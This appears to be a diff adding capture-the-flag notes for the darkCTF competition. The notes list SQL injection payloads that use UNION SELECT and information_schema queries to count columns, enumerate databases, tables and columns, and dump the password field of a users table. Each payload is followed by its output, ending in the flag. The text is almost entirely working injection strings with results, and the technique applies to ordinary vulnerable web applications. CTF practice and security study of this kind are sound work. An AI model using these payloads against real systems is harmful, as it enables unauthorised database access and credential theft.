@@ -1,0 +1,18 @@
+# 3 columns
+'%20UNION%20SELECT%201,2,3%23
+
+# get database
+'+UNION+SELECT+1,2,(SELECT+group_concat(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+-
+	information_schema,id14831952_security,mysql,performance_schema,sys
+
+# get table
+' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='id14831952_security')-- -
+	emails,referers,uagents,users
+
+# get column
+' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='id14831952_security' AND table_name='users')-- -
+	id,username,password
+
+# get value
+' union select 1,2,(select group_concat(password) from id14831952_security.users)-- -
+	darkCTF{uniqu3_ide4_t0_find_fl4g}
